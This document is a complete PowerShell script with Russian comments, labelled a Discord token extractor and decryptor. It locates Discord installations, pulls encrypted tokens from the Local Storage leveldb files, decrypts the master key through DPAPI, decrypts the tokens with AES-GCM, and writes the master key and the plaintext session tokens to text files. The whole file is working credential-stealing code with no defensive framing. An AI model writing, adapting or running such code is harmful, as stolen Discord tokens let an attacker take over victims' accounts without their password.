# Discord Token Extractor + Decryptor - Полный скрипт
# Сохраните как: extract_decrypt.ps1
# Запускать от имени администратора

$ErrorActionPreference = "Continue"

Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.Core

# ============================================================
# ФУНКЦИИ ДЛЯ РАБОТЫ С ТОКЕНАМИ
# ============================================================

function Find-EncryptedTokens {
    param($discord_path)
    
    $leveldb_path = "$discord_path\Local Storage\leveldb"
    if (!(Test-Path $leveldb_path)) { return @() }
    
    $tokens = @()
    $files = Get-ChildItem $leveldb_path -Include *.log,*.ldb -Recurse -ErrorAction SilentlyContinue
    
    foreach ($file in $files) {
        try {
            $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
            if ($content -match 'dQw4w9WgXcQ:([^"]+)') {
                $tokens += $matches[1]
            }
        } catch {}
    }
    
    return $tokens
}

function Get-EncryptedMasterKey {
    param($discord_path)
    
    try {
        $local_state = "$discord_path\Local State"
        if (!(Test-Path $local_state)) { return $null }
        
        $json = Get-Content $local_state -Raw | ConvertFrom-Json
        if (!$json.os_crypt.encrypted_key) { return $null }
        
        $encrypted_key = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
        
        if ($encrypted_key.Length -gt 5) {
            $prefix = [System.Text.Encoding]::ASCII.GetString($encrypted_key[0..4])
            if ($prefix -eq "DPAPI") {
                $encrypted_key = $encrypted_key[5..($encrypted_key.Length-1)]
            }
        }
        
        return $encrypted_key
    } catch {
        return $null
    }
}

function Get-MasterKey {
    param($discord_path)
    
    try {
        $local_state = "$discord_path\Local State"
        if (!(Test-Path $local_state)) { return $null }
        
        $json = Get-Content $local_state -Raw | ConvertFrom-Json
        if (!$json.os_crypt.encrypted_key) { return $null }
        
        $encrypted_key = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
        
        if ($encrypted_key.Length -gt 5) {
            $prefix = [System.Text.Encoding]::ASCII.GetString($encrypted_key[0..4])
            if ($prefix -eq "DPAPI") {
                $encrypted_key = $encrypted_key[5..($encrypted_key.Length-1)]
            }
        }
        
        # Расшифровываем через DPAPI
        $master_key = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $encrypted_key,
            $null,
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        
        return $master_key
    } catch {
        return $null
    }
}

function Decrypt-Token {
    param($encrypted_token, $master_key)
    
    try {
        $encrypted_data = [Convert]::FromBase64String($encrypted_token)
        
        if ($encrypted_data.Length -lt 16) {
            return $null
        }
        
        # Пробуем формат с версией v10/v11
        $version = [System.Text.Encoding]::ASCII.GetString($encrypted_data[0..2])
        
        if ($version -eq "v10" -or $version -eq "v11") {
            $nonce = $encrypted_data[3..14]
            $ciphertext = $encrypted_data[15..($encrypted_data.Length-17)]
            $tag = $encrypted_data[($encrypted_data.Length-16)..($encrypted_data.Length-1)]
            
            try {
                $aes = [System.Security.Cryptography.AesGcm]::new($master_key)
                $plaintext = [byte[]]::new($ciphertext.Length)
                $aes.Decrypt($nonce, $ciphertext, $tag, $plaintext)
                $result = [System.Text.Encoding]::UTF8.GetString($plaintext)
                if ($result.Length -gt 30) {
                    return $result
                }
            } catch {}
        }
        
        # Пробуем 12 байт nonce
        if ($encrypted_data.Length -gt 28) {
            $nonce = $encrypted_data[0..11]
            $ciphertext = $encrypted_data[12..($encrypted_data.Length-17)]
            $tag = $encrypted_data[($encrypted_data.Length-16)..($encrypted_data.Length-1)]
            
            try {
                $aes = [System.Security.Cryptography.AesGcm]::new($master_key)
                $plaintext = [byte[]]::new($ciphertext.Length)
                $aes.Decrypt($nonce, $ciphertext, $tag, $plaintext)
                $result = [System.Text.Encoding]::UTF8.GetString($plaintext)
                if ($result.Length -gt 30) {
                    return $result
                }
            } catch {}
        }
        
        # Пробуем 16 байт nonce
        if ($encrypted_data.Length -gt 32) {
            $nonce = $encrypted_data[0..15]
            $ciphertext = $encrypted_data[16..($encrypted_data.Length-17)]
            $tag = $encrypted_data[($encrypted_data.Length-16)..($encrypted_data.Length-1)]
            
            try {
                $aes = [System.Security.Cryptography.AesGcm]::new($master_key)
                $plaintext = [byte[]]::new($ciphertext.Length)
                $aes.Decrypt($nonce, $ciphertext, $tag, $plaintext)
                $result = [System.Text.Encoding]::UTF8.GetString($plaintext)
                if ($result.Length -gt 30) {
                    return $result
                }
            } catch {}
        }
        
        return $null
    } catch {
        return $null
    }
}

function Test-Token {
    param($token)
    
    if (!$token -or $token.Length -lt 50) { return $false }
    if ($token -match '^[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_-]{27}$') { return $true }
    return $false
}

# ============================================================
# ОСНОВНАЯ ПРОГРАММА
# ============================================================

# Ищем пути к Discord
$paths = @(
    "$env:APPDATA\discord",
    "$env:APPDATA\discordcanary",
    "$env:APPDATA\discordptb",
    "$env:APPDATA\discorddevelopment",
    "$env:LOCALAPPDATA\discord",
    "$env:LOCALAPPDATA\DiscordCanary",
    "$env:LOCALAPPDATA\DiscordPTB",
    "$env:LOCALAPPDATA\DiscordDevelopment"
)

$discord_paths = @()
foreach ($path in $paths) {
    if (Test-Path $path) {
        $discord_paths += $path
    }
}

if ($discord_paths.Count -eq 0) { exit 1 }

$all_encrypted_tokens = @()
$master_key = $null
$decrypted_tokens = @()

foreach ($discord_path in $discord_paths) {
    # Получаем мастер-ключ
    if (!$master_key) {
        $master_key = Get-MasterKey -discord_path $discord_path
        if ($master_key) {
            # Сохраняем расшифрованный мастер-ключ
            $master_key_hex = [BitConverter]::ToString($master_key) -replace '-', ''
            $master_key_hex | Out-File -FilePath "master_key_hex.txt" -Encoding ASCII -NoNewline
            $master_key_base64 = [Convert]::ToBase64String($master_key)
            $master_key_base64 | Out-File -FilePath "master_key_base64.txt" -Encoding ASCII -NoNewline
        }
    }
    
    # Собираем зашифрованные токены
    $tokens = Find-EncryptedTokens -discord_path $discord_path
    if ($tokens) {
        $all_encrypted_tokens += $tokens
    }
}

if ($all_encrypted_tokens.Count -eq 0) { exit 1 }
if (!$master_key) { exit 1 }

# Расшифровываем все токены
foreach ($token_b64 in $all_encrypted_tokens) {
    $result = Decrypt-Token -encrypted_token $token_b64 -master_key $master_key
    if ($result -and (Test-Token $result)) {
        $decrypted_tokens += $result
    }
}

if ($decrypted_tokens.Count -gt 0) {
    # Сохраняем основной токен
    $decrypted_tokens[0] | Out-File -FilePath "discord_token.txt" -Encoding ASCII -NoNewline
    
    # Сохраняем все токены
    $decrypted_tokens | Out-File -FilePath "all_tokens.txt" -Encoding ASCII
}
